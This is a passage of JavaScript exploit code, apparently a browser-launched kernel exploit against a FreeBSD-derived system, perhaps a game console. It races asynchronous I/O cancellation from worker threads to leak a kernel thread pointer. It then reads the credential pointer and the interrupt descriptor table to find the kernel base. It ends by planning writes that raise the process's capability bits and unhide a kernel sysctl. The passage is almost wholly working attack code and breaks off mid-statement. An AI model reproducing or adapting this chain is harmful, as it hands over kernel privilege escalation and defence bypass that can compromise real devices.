        await w.rpc("setup", 15e3, wl.low, wl.hi);
        await w.rpc("armPivot", 15e3, G.G0.low, G.G0.hi);
        w.armed = true;
        w.ctx = makeCtx();
        w.fire = function(num, args, ms) {
          layout(w.ctx, stubAddr.get(num), args);
          return w.rpc(
            "fire",
            ms === void 0 ? 2e4 : ms,
            w.ctx.S.low,
            w.ctx.S.hi
          );
        };
        return w;
      }
      const w1 = await bringWorker("w1");
      const w2 = await bringWorker("w2");
      await w1.fire(SYS.getpid, []);
      const w1pid = w1.ctx.frameDv.getUint32(0, true) | 0;
      await w2.fire(SYS.getpid, []);
      const w2pid = w2.ctx.frameDv.getUint32(0, true) | 0;
      check(
        "pr-two-workers-reach-kernel",
        w1pid > 0 && w2pid > 0,
        "w1 getpid=" + w1pid + " w2 getpid=" + w2pid + " main=" + sc(SYS.getpid).i32
      );
      const mr = sc(
        SYS_MMAP,
        SCRATCH_PAGE,
        65536,
        PROT_RW,
        MAP_FIXED | MAP_ANON | MAP_PRIVATE,
        -1,
        0
      );
      const mgot = new int64(mr.lo, mr.hi);
      if (!check(
        "pr-scratch-page-mapped",
        mgot.hi >>> 0 === 0 && mgot.low >>> 0 === SCRATCH_PAGE,
        "got=0x" + (mgot.low >>> 0).toString(16)
      ))
        return;
      const vs = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
      if (vs < 0) {
        mark("PR-ABORT", "verify socket");
        return;
      }
      opened.push(vs);
      {
        const tAb = new ArrayBuffer(RTH_SIZE);
        keepAlive2.push(tAb);
        const tDv = new DataView(tAb);
        tDv.setUint8(1, RTH_LEN);
        tDv.setUint8(3, RTH_SEGLEFT);
        sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, bufAddr(tAb), RTH_SIZE);
        const RT = SCRATCH_PAGE + 8192;
        lenDv.setUint32(0, RTH_SIZE, true);
        lenDv.setUint32(4, 0, true);
        const g1 = sc(
          SYS.getsockopt,
          vs,
          IPPROTO_IPV6,
          IPV6_RTHDR,
          RT,
          lenAddr
        ).i32;
        const s2 = sc(
          SYS.setsockopt,
          vs,
          IPPROTO_IPV6,
          IPV6_RTHDR,
          RT,
          lenDv.getUint32(0, true)
        ).i32;
        if (!check(
          "pr-scratch-page-kernel-rw",
          g1 === 0 && s2 === 0,
          "copyout=" + g1 + " copyin=" + s2
        ))
          return;
      }
      const mAb = new ArrayBuffer(64);
      keepAlive2.push(mAb);
      const mU32 = new Uint32Array(mAb);
      keepAlive2.push(mU32);
      const mU8 = new Uint8Array(mAb);
      keepAlive2.push(mU8);
      const M_AD = bufAddr(mAb);
      mU32.fill(0);
      mU32[6] = 4;
      const OWNER_LO = 6, OWNER_HI = 7;
      const lkAb = new ArrayBuffer(64);
      keepAlive2.push(lkAb);
      const lkDv = new DataView(lkAb), lkAd = bufAddr(lkAb);
      const LX = lkAd.add32(0), LC = lkAd.add32(16);
      const NBLOCK = 8;
      const bspAb = new ArrayBuffer(8);
      keepAlive2.push(bspAb);
      const bspDv = new DataView(bspAb);
      if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(bspAb)).i32 !== 0) {
        mark("PR-ABORT", "block socketpair");
        return;
      }
      const bsp0 = bspDv.getInt32(0, true), bsp1 = bspDv.getInt32(4, true);
      opened.push(bsp0, bsp1);
      const brbAb = new ArrayBuffer(64);
      keepAlive2.push(brbAb);
      const brqAb = new ArrayBuffer(NBLOCK * 40);
      keepAlive2.push(brqAb);
      const brqDv = new DataView(brqAb);
      for (let k = 0; k < NBLOCK; k++) {
        const b = k * 40;
        put(brqDv, b + 8, 64);
        put(brqDv, b + 16, bufAddr(brbAb));
        brqDv.setInt32(b + 32, bsp0, true);
      }
      const bidAb = new ArrayBuffer(NBLOCK * 4);
      keepAlive2.push(bidAb);
      const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1, CPUSET_SZ = 16;
      const ID64 = new int64(4294967295, 4294967295);
      const mskAb = new ArrayBuffer(CPUSET_SZ);
      keepAlive2.push(mskAb);
      const mskDv = new DataView(mskAb), mskAd = bufAddr(mskAb);
      new Uint8Array(mskAb).fill(0);
      const affGot = sc(
        SYS.cpuset_getaffinity,
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        ID64,
        CPUSET_SZ,
        mskAd
      ).i32;
      const savedMask = mskDv.getUint32(0, true) >>> 0;
      const cores = [];
      for (let i = 0; i < 32; i++) if (savedMask & 1 << i) cores.push(i);
      mark(
        "PIN-AVAIL",
        "rv=" + affGot + " mask=0x" + savedMask.toString(16) + " cores=" + cores.join(",")
      );
      if (!check(
        "pin-read-mask",
        affGot === 0 && cores.length > 0,
        "rv=" + affGot + " cores=" + cores.length
      ))
        return;
      const PINCORE = params.get("core") ? parseInt(params.get("core"), 10) : cores[0];
      new Uint8Array(mskAb).fill(0);
      mskDv.setUint32(0, 1 << PINCORE >>> 0, true);
      const affSet = sc(
        SYS.cpuset_setaffinity,
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        ID64,
        CPUSET_SZ,
        mskAd
      ).i32;
      new Uint8Array(mskAb).fill(0);
      sc(
        SYS.cpuset_getaffinity,
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        ID64,
        CPUSET_SZ,
        mskAd
      );
      const backMask = mskDv.getUint32(0, true) >>> 0;
      mark(
        "PIN-SET",
        "core=" + PINCORE + " rv=" + affSet + " reads back 0x" + backMask.toString(16)
      );
      if (!check(
        "MAIN-PINNED",
        affSet === 0 && backMask === 1 << PINCORE >>> 0,
        "core=" + PINCORE + " mask=0x" + backMask.toString(16) + " (free and malloc in armOnce now share one UMA per-cpu bucket)"
      ))
        return;
      const OTHER = cores.length > 1 ? cores[0] === PINCORE ? cores[cores.length - 1] : cores[0] : PINCORE;
      const msk2Ab = new ArrayBuffer(CPUSET_SZ);
      keepAlive2.push(msk2Ab);
      const msk2Dv = new DataView(msk2Ab), msk2Ad = bufAddr(msk2Ab);
      new Uint8Array(msk2Ab).fill(0);
      msk2Dv.setUint32(0, 1 << OTHER >>> 0, true);
      let wpin = "skipped";
      if (OTHER !== PINCORE) {
        const aw = [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, msk2Ad];
        await w1.fire(SYS.cpuset_setaffinity, aw);
        const r1 = w1.ctx.frameDv.getUint32(0, true) | 0;
        await w2.fire(SYS.cpuset_setaffinity, aw);
        const r2 = w2.ctx.frameDv.getUint32(0, true) | 0;
        wpin = "w1=" + r1 + " w2=" + r2;
        check(
          "WORKERS-PINNED",
          r1 === 0 && r2 === 0,
          "workers on core " + OTHER + ", main on " + PINCORE + " -- " + wpin
        );
      } else {
        mark("PIN-ONE-CORE", "only one core available, workers share it");
      }
      mark("PIN-SPLIT", "main=" + PINCORE + " workers=" + OTHER + " " + wpin);
      pinRestore = function() {
        new Uint8Array(mskAb).fill(0);
        mskDv.setUint32(0, savedMask, true);
        const r = sc(
          SYS.cpuset_setaffinity,
          CPU_LEVEL_WHICH,
          CPU_WHICH_TID,
          ID64,
          CPUSET_SZ,
          mskAd
        ).i32;
        mark("PIN-RESTORED", "rv=" + r + " mask=0x" + savedMask.toString(16));
      };
      mark(
        "PR-SATURATE",
        "rv=" + sc(
          SYS.aio_submit_cmd,
          1 | 4096,
          bufAddr(brqAb),
          NBLOCK,
          3,
          bufAddr(bidAb)
        ).i32
      );
      const spAb = new ArrayBuffer(8);
      keepAlive2.push(spAb);
      const spDv = new DataView(spAb);
      if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(spAb)).i32 !== 0) {
        mark("PR-ABORT", "socketpair");
        return;
      }
      const sp0 = spDv.getInt32(0, true), sp1 = spDv.getInt32(4, true);
      opened.push(sp0, sp1);
      const rbAb = new ArrayBuffer(64);
      keepAlive2.push(rbAb);
      const rqAb = new ArrayBuffer(80);
      keepAlive2.push(rqAb);
      const rqDv = new DataView(rqAb);
      for (let k = 0; k < 2; k++) {
        const b = k * 40;
        put(rqDv, b + 8, 64);
        put(rqDv, b + 16, bufAddr(rbAb));
        rqDv.setInt32(b + 32, sp0, true);
      }
      const idAb2 = new ArrayBuffer(8);
      keepAlive2.push(idAb2);
      const idAd2 = bufAddr(idAb2);
      const stAb2 = new ArrayBuffer(8);
      keepAlive2.push(stAb2);
      const stAd2 = bufAddr(stAb2);
      const toAb = new ArrayBuffer(8);
      keepAlive2.push(toAb);
      const toDv = new DataView(toAb), toAd = bufAddr(toAb);
      const TOWAIT = params.get("towait") ? parseInt(params.get("towait"), 10) : 1e3;
      toDv.setUint32(0, TOWAIT, true);
      toDv.setUint32(4, 0, true);
      mark(
        "PR-TOWAIT",
        "aio_multi_wait timeout=" + TOWAIT + "us was=100000us deaths_in_that_sleep=all armings=4 exposure_was=400ms"
      );
      const POOL = [];
      for (let i = 0; i < SPRAY; i++) {
        const fd = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
        if (fd < 0) break;
        POOL.push(fd);
        opened.push(fd);
      }
      mark("PR-POOL", "reclaim sockets=" + POOL.length);
      const pAb = new ArrayBuffer(RTH_SIZE);
      keepAlive2.push(pAb);
      const pDv = new DataView(pAb), pAd = bufAddr(pAb);
      let armCount = 0;
      let waitMs = -1;
      let armTrace = false;
      const REAP = params.get("reap") !== "0";
      const REAPLEAK = params.get("reapleak") !== "0";
      const PARK = params.get("park") === "1";
      let reapedGen = -1;
      const lkNodes = new ArrayBuffer(NODE_SZ * N_LEAK);
      keepAlive2.push(lkNodes);
      const lkNdv = new DataView(lkNodes), lkNad = bufAddr(lkNodes);
      async function leakCurthread(w) {
        toDv.setUint32(0, TOWAIT, true);
        toDv.setUint32(4, 0, true);
        new Uint8Array(lkNodes).fill(0);
        for (let i = 0; i < N_LEAK; i++) {
          const o = i * NODE_SZ;
          put(lkNdv, o + 0, LX);
          put(lkNdv, o + 8, LC);
          put(lkNdv, o + 16, M_AD);
          put(lkNdv, o + 48, i === N_LEAK - 1 ? 0 : lkNad.add32(o + NODE_SZ));
        }
        lkDv.setInt32(0, 1073741824, true);
        lkDv.setInt32(16, 1073741824, true);
        mU32[6] = 4;
        mU32[7] = 0;
        setNode0(lkNad, LC);
        const a = armOnce();
        if (a.indexOf("ok") !== 0) {
          mark("PR-LEAK-ARM", w.name + " " + a);
          return null;
        }
        {
          let wu = 0;
          for (let i = 0; i < 2e5; i++) {
            mU8[48 + (i & 15)] = i & 255;
            wu ^= mU32[OWNER_LO];
          }
          if (wu === 2147483647) mark("PR-WARM", "" + wu);
        }
        const samples = [];
        let hitLo = 0, hitHi = 0, hits = 0;
        let pr = null;
        try {
          pr = w.fire(SYS.aio_multi_cancel, [idAd2, 1, stAd2]);
        } catch (e) {
        }
        for (let i = 0; i < SPIN; i++) {
          mU8[48 + (i & 15)] = i & 255;
          const hi1 = mU32[OWNER_HI];
          if (hi1 !== 0) {
            const lo = mU32[OWNER_LO];
            const hi2 = mU32[OWNER_HI];
            if (hi1 === hi2 && lo !== 4) {
              if (!hits) {
                hitLo = lo;
                hitHi = hi1;
              }
              hits++;
              if (samples.length < 32)
                samples.push(
                  (hi1 >>> 0).toString(16).padStart(8, "0") + (lo >>> 0).toString(16).padStart(8, "0")
                );
              if (hits > 48) break;
            }
          }
        }
        const drop = 1073741824 - lkDv.getInt32(0, true);
        const uniq = {};
        for (const v of samples) uniq[v] = (uniq[v] || 0) + 1;
        const keys = Object.keys(uniq);
        mark(
          "PR-LEAK",
          w.name + " hits=" + hits + " walked=" + drop + "/" + N_LEAK + " samples=" + (keys.length ? keys.map((k) => k + " x" + uniq[k]).join(" ") : "none")
        );
        try {
          if (pr) await pr;
        } catch (e) {
        }
        if (!hits || hitHi >>> 0 < 4294901760 || keys.length !== 1) return null;
        return new int64(hitLo >>> 0, hitHi >>> 0);
      }
      const CT1 = await leakCurthread(w1);
      armTrace = true;
      if (REAPLEAK) {
        put(lkNdv, 0, LX);
        put(lkNdv, 8, LC);
        put(lkNdv, 48, 0);
        const rlc = sc(SYS.aio_multi_cancel, idAd2, 2, stAd2).i32;
        const rlp = sc(SYS.aio_multi_poll, idAd2, 2, stAd2).i32;
        const rld = sc(SYS.aio_multi_delete, idAd2, 2, stAd2).i32;
        mark("PR-REAPLEAK", "cancel=" + rlc + " poll=" + rlp + " delete=" + rld);
      } else {
        mark("PR-REAPLEAK", "skipped park=" + (PARK ? 1 : 0));
      }
      mark(
        "PR-CURTHREADS",
        "w1=" + CT1 + " (w2 not leaked: one arming saved)  -- both workers are now PARKED and issue no further syscalls"
      );
      let parkFail = "";
      if (!PARK) {
        mark(
          "PR-PARK",
          "skipped park=0 restore=self reapleak=" + (REAPLEAK ? 1 : 0)
        );
      } else {
        const prev = w1.worker.onmessage;
        w1.worker.onmessage = function(e) {
          const d = e.data || {};
          if (d.id === -1) {
            parkFail += " " + (d.value || d.type);
            return;
          }
          if (prev) prev.call(this, e);
        };
        w1.worker.postMessage({ id: -1, name: "spin", args: [] });
        await new Promise((r) => setTimeout(r, 250));
        mark("PR-PARK", "w1 spin posted parkfail=" + (parkFail || "none"));
      }
      if (PARK && !check(
        "W1-PARKED",
        parkFail === "",
        parkFail ? "rpc_worker.js has no spin():" + parkFail + " -- reload, nothing kernel has been touched yet" : "w1 cannot reach syscallenter again, so cred_update_thread can never crfree() the wild td_ucred passA is about to create"
      ))
        return;
      const STEP_OFF = 2, STEP_MAG = 65536, PAIR = STEP_MAG + 1;
      const TD_UCRED_OFF = 304, CR_RUID_OFF = 8;
      const KA = params.get("ka") ? parseInt(params.get("ka"), 10) : 32768;
      const KB = PAIR;
      const dumAb = new ArrayBuffer(64);
      keepAlive2.push(dumAb);
      const dumDv = new DataView(dumAb), dumAd = bufAddr(dumAb);
      dumDv.setInt32(0, 1073741824, true);
      const DUM = dumAd.add32(0);
      const snkAb = new ArrayBuffer(64);
      keepAlive2.push(snkAb);
      const snkDv = new DataView(snkAb), snkAd = bufAddr(snkAb);
      const SNK = snkAd.add32(0);
      const N0SINK = snkAd.add32(32);
      const MAXN = 2 * KA + KB + 16;
      const arAb = new ArrayBuffer(NODE_SZ * MAXN);
      keepAlive2.push(arAb);
      const arDv = new DataView(arAb), arAd = bufAddr(arAb);
      mark(
        "PR-ARENA",
        "nodes=" + MAXN + " bytes=0x" + (NODE_SZ * MAXN).toString(16) + " @" + arAd
      );
      const gfAb = new ArrayBuffer(128);
      keepAlive2.push(gfAb);
      const gfDv = new DataView(gfAb), gfAd = bufAddr(gfAb);
      const glAb = new ArrayBuffer(8);
      keepAlive2.push(glAb);
      const glDv = new DataView(glAb), glAd = bufAddr(glAb);
      const X1 = CT1.add32(TD_UCRED_OFF);
      mark(
        "PR-PASSA-TARGET",
        "X1 = w1.curthread+0x130 (td_ucred) = " + X1 + "  KA=" + KA + " pair=0x" + PAIR.toString(16) + " covers up to " + KA * PAIR
      );
      {
        let i = 0;
        for (let j = 0; j < KA; j++) {
          wnode(i++, X1.add32(STEP_OFF), DUM, false);
          wnode(i++, X1, SNK, false);
        }
        const subA = (4294967296 - KA * PAIR % 4294967296) % 4294967296;
        const dA = [
          subA & 255,
          subA >>> 8 & 255,
          subA >>> 16 & 255,
          subA >>> 24 & 255
        ];
        const nA = dA[0] + dA[1] + dA[2] + dA[3];
        mark(
          "PR-RESTOREA",
          "passA subtracted " + KA * PAIR + " sub=0x" + subA.toString(16) + " digits=" + dA.join(",") + " nodes=" + nA
        );
        if (!check("pr-restorea-bounded", nA >= 1 && nA <= 1020, "n=" + nA))
          return;
        {
          const pa = [];
          for (let j = 0; j < 4; j++) for (let d = 0; d < dA[j]; d++) pa.push(j);
          for (let j = 0; j < pa.length; j++)
            wnode(i++, X1.add32(pa[j]), DUM, j === pa.length - 1);
        }
        const mA = runChain(i, "passA");
        if (mA === null) return;
        if (mA <= 0) {
          mark(
            "PR-PASSA-NOCROSS",
            "no crossing: low dword either exceeds " + KA * PAIR + " or is already negative (top bit set)"
          );
          if (retryBenign("passA-nocross")) return;
          check("POINTER-READ", false, "pass A found no crossing");
          return;
        }
        var kA = KA - mA + 1;
        mark(
          "PR-PASSA",
          "m=" + mA + " -> k=" + kA + "  W0 in (" + (kA - 1) * PAIR + ", " + kA * PAIR + "]"
        );
      }
      const RED = (kA - 1) * PAIR;
      const dga = [
        RED & 255,
        RED >>> 8 & 255,
        RED >>> 16 & 255,
        RED >>> 24 & 255
      ];
      const nDga = dga[0] + dga[1] + dga[2] + dga[3];
      mark(
        "PR-RESTORE-PLAN",
        "reduce=" + RED + " digits=" + dga.join(",") + " nodes=" + nDga
      );
      if (!check(
        "pr-restore-bounded",
        nDga > 0 && nDga <= 1020 && RED > 0,
        "n=" + nDga
      ))
        return;
      const X2 = X1;
      mark(
        "PR-PASSB-TARGET",
        "x2=" + X2 + " same_copy=1 restore_digits=" + nDga + " probes=" + KB
      );
      let W0 = 0;
      {
        let i = 0;
        const posA3 = [];
        for (let j = 0; j < 4; j++) for (let d = 0; d < dga[j]; d++) posA3.push(j);
        for (let j = 0; j < posA3.length; j++)
          wnode(i++, X2.add32(posA3[j]), DUM, false);
        for (let j = 0; j < KB; j++) wnode(i++, X2, SNK, false);
        const totB = (RED + KB) % 4294967296;
        const subB = (4294967296 - totB) % 4294967296;
        const dB = [
          subB & 255,
          subB >>> 8 & 255,
          subB >>> 16 & 255,
          subB >>> 24 & 255
        ];
        const nB = dB[0] + dB[1] + dB[2] + dB[3];
        mark(
          "PR-RESTOREB",
          "passB subtracted " + totB + " sub=0x" + subB.toString(16) + " digits=" + dB.join(",") + " nodes=" + nB
        );
        if (!check(
          "pr-restoreb-bounded",
          nB >= 1 && nB <= 1020,
          "n=" + nB + " min=1 max=1020 unterminated_if=0"
        )) {
          mark("REFUSING-TO-ARM", "reason=passb-restore-empty");
          return;
        }
        {
          const pb = [];
          for (let j = 0; j < 4; j++) for (let d = 0; d < dB[j]; d++) pb.push(j);
          for (let j = 0; j < pb.length; j++)
            wnode(i++, X2.add32(pb[j]), DUM, j === pb.length - 1);
        }
        const mB = runChain(i, "passB");
        if (mB === null) return;
        if (mB <= 0) {
          mark(
            "PR-PASSB-NOCROSS",
            "remainder never crossed -- k may be off by one, or the two threads' td_proc differ"
          );
          if (retryBenign("passB-nocross")) return;
          check("POINTER-READ", false, "pass B found no crossing");
          return;
        }
        const R = KB - mB + 1;
        W0 = (kA - 1) * PAIR + R;
        mark(
          "PR-PASSB",
          "m=" + mB + " -> R=" + R + "  => low dword = " + W0 + " (0x" + (W0 >>> 0).toString(16) + ")"
        );
      }
      const UCRED = new int64(W0 >>> 0, CT1.hi >>> 0);
      mark(
        "PR-UCRED",
        "ucred = " + UCRED + "  (high dword taken from the leaked curthread prefix 0x" + (CT1.hi >>> 0).toString(16) + ")"
      );
      check(
        "pointer-read-shape-ok",
        W0 >>> 0 !== 0 && (W0 >>> 0 & 7) === 0,
        "low=0x" + (W0 >>> 0).toString(16) + " 8-byte aligned=" + ((W0 >>> 0 & 7) === 0)
      );
      clearRetry();
      const IDT = new int64(6656, 4294967168);
      const GATE_SZ = 16;
      const RVA_RSVD = off.k_idt_rsvd;
      const STEPMAG = 16777216;
      const SWEEP = params.get("sweep") ? parseInt(params.get("sweep"), 10) : 256;
      const B = {};
      const JOBS = [
        {
          n: "b0",
          j: 0,
          g: 22,
          want: null,
          low: function() {
            return 0;
          }
        },
        {
          n: "b1",
          j: 1,
          g: 24,
          want: null,
          low: function() {
            return B.b0 << 16 >>> 0;
          }
        },
        {
          n: "b3",
          j: 3,
          g: 25,
          want: 0,
          low: function() {
            return (32 << 16 | B.b1 << 8 | B.b0) >>> 0;
          }
        },
        {
          n: "b5",
          j: 5,
          g: 26,
          want: 142,
          low: function() {
            return 32;
          }
        },
        {
          n: "b6",
          j: 6,
          g: 27,
          want: null,
          low: function() {
            return 9306112;
          }
        },
        {
          n: "b7",
          j: 7,
          g: 31,
          want: null,
          low: function() {
            return (B.b6 << 16 | 36352) >>> 0;
          }
        },
        {
          n: "b6d",
          j: 6,
          g: 20,
          want: null,
          low: function() {
            return 9306112;
          }
        },
        {
          n: "b7d",
          j: 7,
          g: 15,
          want: null,
          low: function() {
            return (B.b6 << 16 | 36352) >>> 0;
          }
        }
      ];
      const NJ = JOBS.length, NEED = NJ * SWEEP * 2;
      mark(
        "ANCHOR-PLAN",
        "idt=" + IDT + " rsvd_rva=0x" + RVA_RSVD.toString(16) + " jobs=" + NJ + " sweep=" + SWEEP + " nodes=" + NEED + " gates=" + JOBS.map(function(q) {
          return q.g;
        }).join(",") + " armings_so_far=" + armCount
      );
      if (!check(
        "anchor-nodes-bounded",
        NEED <= MAXN && SWEEP >= 8 && SWEEP <= 1024,
        "need=" + NEED + " arena=" + MAXN + " sweep=" + SWEEP
      ))
        return;
      {
        let lo = 16777216, hi = -1;
        for (let q = 0; q < NJ; q++) {
          const o = JOBS[q].g * GATE_SZ + JOBS[q].j;
          if (o - 3 < lo) lo = o - 3;
          if (o + 3 > hi) hi = o + 3;
        }
        if (!check(
          "anchor-inside-idt",
          lo >= 0 && hi < 4096,
          "lo=+0x" + lo.toString(16) + " hi=+0x" + hi.toString(16) + " limit=0x1000"
        ))
          return;
        mark(
          "ANCHOR-SPAN",
          "from=" + IDT.add32(lo) + " to=" + IDT.add32(hi) + " gates=15,20-27,31 reserved=1"
        );
      }
      const anAb = new ArrayBuffer(4 * NJ * SWEEP);
      keepAlive2.push(anAb);
      const anDv = new DataView(anAb), anAd = bufAddr(anAb);
      for (let i = 0; i < NJ * SWEEP; i++) anDv.setInt32(i * 4, 1073741824, true);
      {
        let idx = 0;
        for (let q = 0; q < NJ; q++) {
          const o = JOBS[q].g * GATE_SZ + JOBS[q].j;
          const stepAd = IDT.add32(o);
          const probeAd = IDT.add32(o - 3);
          for (let k = 0; k < SWEEP; k++) {
            wnode(idx++, stepAd, DUM, false);
            wnode(idx++, probeAd, anAd.add32((q * SWEEP + k) * 4), false);
          }
        }
        put(arDv, (idx - 1) * NODE_SZ + 48, 0);
        if (runChain(idx, "anchor-sweep") === null) return;
      }
      let bad = 0;
      for (let q = 0; q < NJ; q++) {
        const J = JOBS[q];
        let obs = "", ones = 0, edge = -1;
        for (let k = 0; k < SWEEP; k++) {
          const f = 1073741824 - anDv.getInt32((q * SWEEP + k) * 4, true) > 0;
          obs += f ? "1" : "0";
          if (f) ones++;
          if (k > 0 && obs.charCodeAt(k) !== obs.charCodeAt(k - 1) && edge < 0)
            edge = k;
        }
        const low = J.low();
        const d = decodeByte(obs, low);
        B[J.n] = d.b;
        if (d.b < 0 || d.n !== 1) bad++;
        mark(
          "ANCHOR-BYTE",
          J.n + " gate=" + J.g + " j=" + J.j + " low=0x" + low.toString(16) + " ones=" + ones + " edge=" + edge + " cands=" + d.n + " val=" + (d.b < 0 ? "NO-MATCH" : "0x" + d.b.toString(16))
        );
        if (J.want !== null)
          check(
            "anchor-control-" + J.n,
            d.b === J.want,
            "want=0x" + J.want.toString(16) + " got=" + (d.b < 0 ? "none" : "0x" + d.b.toString(16))
          );
      }
      if (!check(
        "anchor-every-byte-unique",
        bad === 0,
        "nomatch=" + bad + " jobs=" + NJ
      ))
        return;
      check(
        "anchor-duplicates-agree",
        B.b6 === B.b6d && B.b7 === B.b7d,
        "b6=0x" + B.b6.toString(16) + " b6d=0x" + B.b6d.toString(16) + " b7=0x" + B.b7.toString(16) + " b7d=0x" + B.b7d.toString(16)
      );
      const handlerLo = (B.b7 << 24 >>> 0) + (B.b6 << 16 >>> 0) + (B.b1 << 8) + B.b0 >>> 0;
      const kbLo = handlerLo - RVA_RSVD >>> 0;
      const KBASE = new int64(kbLo, 4294967295);
      mark(
        "ANCHOR-HANDLER",
        "handler=0xffffffff" + handlerLo.toString(16).padStart(8, "0") + " rva=0x" + RVA_RSVD.toString(16) + " b7=0x" + B.b7.toString(16) + " b6=0x" + B.b6.toString(16) + " b1=0x" + B.b1.toString(16) + " b0=0x" + B.b0.toString(16)
      );
      const kbAligned = (kbLo & 16383) === 0;
      check(
        "ANCHOR-KERNEL-BASE",
        kbAligned,
        "kernel_base=" + KBASE + " aligned0x4000=" + (kbAligned ? 1 : 0) + " low=0x" + kbLo.toString(16)
      );
      mark(
        "ANCHOR-VERDICT",
        "fw=" + fwKey + " kernel_base=" + KBASE + " armings=" + armCount + " curthread=" + CT1 + " verdict=" + (kbAligned ? "ANCHORED" : "REJECTED") + (kbAligned ? " next=kfile" : " reason=not_0x4000_aligned")
      );
      if (!kbAligned) {
        allDone = true;
        return;
      }
      const OID = KBASE.add32(off.k_oid_kern_file);
      const O_NUM = OID.add32(16);
      const O_VIS = OID.add32(80);
      const O_RAN = OID.add32(84);
      const KERN_FILE_NUM = 15;
      const ONUM_N = params.get("onum") ? parseInt(params.get("onum"), 10) : 64;
      mark(
        "KF-TARGETS",
        "oid=" + OID + " oid_number=" + O_NUM + " vis=" + O_VIS + " ran=" + O_RAN
      );
      const CAPS_B = UCRED.add32(103);
      const CAPS_PR = UCRED.add32(100);
      const CAPS_TARGET = 96;
      const CAPS_RESTORE = params.get("caprestore") === "1";
      mark(
        "CAPS-TARGET",
        "ucred=" + UCRED + " caps0=" + UCRED.add32(96) + " byte=" + CAPS_B + " probe=" + CAPS_PR + " want_bit=62 target=0x" + CAPS_TARGET.toString(16)
      );
      const mf1 = multiFire(
        [
          { kind: "sweep", step: CAPS_B, probe: CAPS_PR, low: 0 },
          { kind: "oracle", addr: O_NUM, n: ONUM_N }
        ],
        "caps-byte+oid_number"
      );
      if (mf1 === null) return;
      const cb = mf1[0], on = mf1[1];
      const bLo = cb.b - 1 & 255, bHi = cb.b;
      const setLo = (bLo & 64) !== 0, setHi = (bHi & 64) !== 0;
      mark(
        "CAPS-BYTE",
        "b=" + (cb.b < 0 ? "NO-MATCH" : "0x" + cb.b.toString(16)) + " cands=" + cb.n + " true_in={0x" + bLo.toString(16) + ",0x" + bHi.toString(16) + "} bit62_lo=" + (setLo ? 1 : 0) + " bit62_hi=" + (setHi ? 1 : 0)
      );
      if (!check(
        "caps-byte-decoded",
        cb.b >= 0 && cb.n === 1,
        "b=" + cb.b + " cands=" + cb.n
      ))
        return;
      let capsWrote = 0, capsSkip = "", capsPend = 0;
      if (setLo && setHi) {
        capsSkip = "already-set";
        mark("CAPS-SKIP", "bit62 set for both candidates -- no write");
      } else if (params.get("nocaps") === "1") {
        capsSkip = "opted-out";
        mark("CAPS-SKIP", "?nocaps=1 -- read-only, gate 2 stays closed");
      } else {
        const dN = bHi + 1 & 255;
        const fin = [
          bHi - dN & 255,
          bLo - dN & 255,
          bHi - dN - 1 & 255,
          bLo - dN - 1 & 255
        ];
        const allSet = fin.every(function(v) {
          return (v & 64) !== 0;
        });
        mark(
          "CAPS-PLAN",
          "decrement " + CAPS_B + " by " + dN + " -> final in {" + fin.map(function(v) {
            return "0x" + v.toString(16);
          }).join(",") + "} all_bit62=" + (allSet ? 1 : 0) + " wraps=1"
        );
        if (!check(
          "caps-plan-ok",
          dN > 0 && dN <= 256 && allSet,
          "n=" + dN + " finals=" + fin.join(",")
        ))
          return;
        capsPend = dN;
      }
      const IPV6_TCLASS = 61, KF_MARK = 65;
      const kfSock = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
      if (kfSock >= 0) {
        opened.push(kfSock);
        const tAb = new ArrayBuffer(4);
        const tDv = new DataView(tAb);
        tDv.setInt32(0, KF_MARK, true);
        sc(SYS.setsockopt, kfSock, IPPROTO_IPV6, IPV6_TCLASS, bufAddr(tAb), 4);
      }
      if (!check(
        "kf-target-socket",
        kfSock >= 0,
        "fd=" + kfSock + " tclass=0x" + KF_MARK.toString(16)
      ))
        return;
      const mibAb = new ArrayBuffer(8);
      keepAlive2.push(mibAb);
      const mibDv = new DataView(mibAb), mibAd = bufAddr(mibAb);
      mibDv.setInt32(0, 1, true);
      mibDv.setInt32(4, KERN_FILE_NUM, true);
      const KF_BYTES = 1 << 20;
      const kfAb = new ArrayBuffer(KF_BYTES);
      keepAlive2.push(kfAb);
      const kfDv = new DataView(kfAb), kfAd = bufAddr(kfAb);
      const olAb = new ArrayBuffer(8);
      keepAlive2.push(olAb);
      const olDv = new DataView(olAb), olAd = bufAddr(olAb);
      const base0 = kernFile(false, "baseline");
      check(
        "kf-baseline-is-enoent",
        base0.rv < 0 && base0.err === 2,
        "rv=" + base0.rv + " errno=" + base0.err + " want=-1/2"
      );
      mark(
        "KF-OIDNUM",
        "addr=" + O_NUM + " n=" + ONUM_N + " m=" + on.m + " v=" + on.v + " want=" + KERN_FILE_NUM
      );
      if (!check(
        "KF-ANCHOR-CONFIRMED",
        on.v === KERN_FILE_NUM,
        "oid_number=" + on.v + " want=" + KERN_FILE_NUM + " kernel_base=" + KBASE
      ))
        return;
      const curNum = KERN_FILE_NUM - ONUM_N >>> 0;
      const pNum = planSub(curNum, curNum - KERN_FILE_NUM >>> 0);
      mark(
        "KF-RESTORE-PLAN",
        "cur=0x" + curNum.toString(16) + " digits=" + pNum.d.join(",") + " nodes=" + pNum.n + " clean=" + (pNum.clean ? 1 : 0)
      );
      if (!check(
        "kf-restore-clean",
        pNum.clean && pNum.n <= 1020,
        "nodes=" + pNum.n + " clean=" + (pNum.clean ? 1 : 0)
      ))
        return;
      {
        let i = emitSub(O_NUM, 0, pNum);
        wnode(i++, O_VIS, DUM, false);
        for (let q = 0; q < capsPend; q++) wnode(i++, CAPS_B, DUM, false);
        put(arDv, (i - 1) * NODE_SZ + 48, 0);
        mark(
          "KF-WRITE",
          "restore_oid_number=" + pNum.n + " unhide=1 caps=" + capsPend + " total=" + i
        );
        if (runChain(i, "restore+unhide+caps") === null) return;
        capsWrote = capsPend;
      }
      mark(
        "CAPS-DONE",
